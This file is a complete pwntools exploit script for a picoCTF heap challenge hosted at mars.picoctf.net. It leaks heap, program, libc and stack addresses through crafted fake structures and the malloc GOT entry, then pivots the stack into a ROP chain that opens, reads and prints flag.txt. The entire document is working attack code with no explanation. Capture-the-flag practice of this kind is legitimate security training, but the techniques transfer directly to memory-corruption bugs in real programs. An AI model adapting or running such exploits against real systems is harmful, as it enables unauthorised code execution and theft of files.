from pwn import *

HOST, PORT = 'mars.picoctf.net', 31638
r = remote(HOST, PORT)

r.sendlineafter('choice: \n', '0 0 0')
r.sendlineafter('choice: \n', '1 0 24')
r.sendline(' '.join(['65' for i in range(24)]))
for i in range(6):
    r.sendlineafter('choice: \n', f'0 {i+1} 0')
r.sendlineafter('choice: \n', '4 1')
r.sendlineafter('choice: \n', '4 2')
r.sendlineafter('choice: \n', '4 0')
r.sendlineafter('choice: \n', '2 0')
heap_leak = u64(r.recvline().strip().ljust(8, b'\x00'))
heap = heap_leak - 0x13cf0

r.sendlineafter('choice: \n', '0 0 0')
r.sendlineafter('choice: \n', '1 0 24')
r.sendline(' '.join(['65' for i in range(24)]))
r.sendlineafter('choice: \n', '4 3')
r.sendlineafter('choice: \n', '4 0')
r.sendlineafter('choice: \n', '0 1 0')
r.sendlineafter('choice: \n', '2 0')
program_leak = u64(r.recvline().strip().ljust(8, b'\x00'))
program = program_leak - 0x202ce8

malloc_got = program + 0x202f88
fake_student = b'A' * 8 + p64(malloc_got) + p64(8)
r.sendlineafter('choice: \n', '0 0 0')
r.sendlineafter('choice: \n', '0 1 0')
r.sendlineafter('choice: \n', '4 0')
r.sendlineafter('choice: \n', '1 1 24')
r.sendline(b' '.join(str(fake_student[i]).encode() for i in range(24)))
r.sendlineafter('choice: \n', '2 0')
libc_malloc = u64(r.recv(6).strip().ljust(8, b'\x00'))
libc = libc_malloc - 0x97140

libc_environ = libc + 0x3ee098
fake_student = b'A' * 8 + p64(libc_environ) + p64(8)
r.sendlineafter('choice: \n', '0 0 0')
r.sendlineafter('choice: \n', '0 1 0')
r.sendlineafter('choice: \n', '4 0')
r.sendlineafter('choice: \n', '1 1 24')
r.sendline(b' '.join(str(fake_student[i]).encode() for i in range(24)))
r.sendlineafter('choice: \n', '2 0')
stack_leak = u64(r.recv(6).strip().ljust(8, b'\x00'))
stack = stack_leak - 0x130

pop_rax = libc + 0x43ae8
pop_rdi = libc + 0x215bf
pop_rsi = libc + 0x23eea
pop_rdx = libc + 0x1b96
syscall = libc + 0xd2745
pop_rsp = libc + 0x3960

read_addr = program + 0x203048
flag_addr = heap + 0x13630
rop_addr = heap + 0x12dd0

sh = flat([
    p64(pop_rax) + p64(2),
    p64(pop_rdi) + p64(flag_addr),
    p64(pop_rsi) + p64(0),
    p64(pop_rdx) + p64(0),
    p64(syscall),

    p64(pop_rax) + p64(0),
    p64(pop_rdi) + p64(3),
    p64(pop_rsi) + p64(read_addr),
    p64(pop_rdx) + p64(64),
    p64(syscall),

    p64(pop_rax) + p64(1),
    p64(pop_rdi) + p64(1),
    p64(pop_rsi) + p64(read_addr),
    p64(pop_rdx) + p64(64),
    p64(syscall)
]).ljust(500, b'\x00')

r.sendlineafter('choice: \n', '0 15 0')
r.sendlineafter('choice: \n', '1 15 500')
r.sendline(b' '.join([str(sh[i]).encode() for i in range(500)]))
r.sendlineafter('choice: \n', '0 14 0')
r.sendlineafter('choice: \n', '1 14 500')
r.sendline(b' '.join([str(x).encode() for x in b'flag.txt'.ljust(500, b'\x00')]))

for i in range(9):
    r.sendlineafter('choice: \n', f'0 {i} 0')
for i in range(7):
    r.sendlineafter('choice: \n', f'4 {i+2}')
r.sendlineafter('choice: \n', '4 0')
r.sendlineafter('choice: \n', '4 1')
r.sendlineafter('choice: \n', '4 0')
for i in range(7):
    r.sendlineafter('choice: \n', '0 3 0')
fake_struct = p64(stack) + b'A' * 16
r.sendlineafter('choice: \n', '1 0 24')
r.sendline(b' '.join([str(fake_struct[i]).encode() for i in range(24)]))
r.sendlineafter('choice: \n', '0 0 0')
r.sendlineafter('choice: \n', '0 0 0')
r.sendlineafter('choice: \n', '1 0 24')
payload = p64(pop_rsp) + p64(rop_addr) + p64(0)
r.sendline(b' '.join([str(payload[i]).encode() for i in range(24)]))

r.interactive()